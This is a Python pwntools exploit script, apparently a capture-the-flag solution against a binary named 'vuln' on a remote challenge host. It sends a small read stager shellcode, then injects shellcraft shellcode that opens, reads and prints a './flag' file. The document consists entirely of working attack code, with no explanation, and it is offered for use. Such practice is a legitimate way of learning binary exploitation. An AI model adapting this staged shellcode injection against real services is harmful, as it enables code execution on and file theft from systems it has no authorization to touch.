from pwn import *
import time

context.log_level = 'debug'

debug = True

elf = ELF("./vuln")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 31627)


def tdebug():
    gdb.attach(io)
    pause()


context.arch = elf.arch
context.os = "linux"

print(context)
io.recv()

tdebug()
shellcode = asm("""
        xor rax, rax;
        mov dl,0x80;
        mov rsi, rdx;
        push rax;
        pop rdi;
        syscall;
        jmp rdx
        """)
io.sendline(shellcode)
print(len(shellcode))

raw_input()
shellcode = shellcraft.pushstr("./flag")
shellcode += shellcraft.open("rsp")
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)
io.sendline(asm(shellcode))

io.interactive()
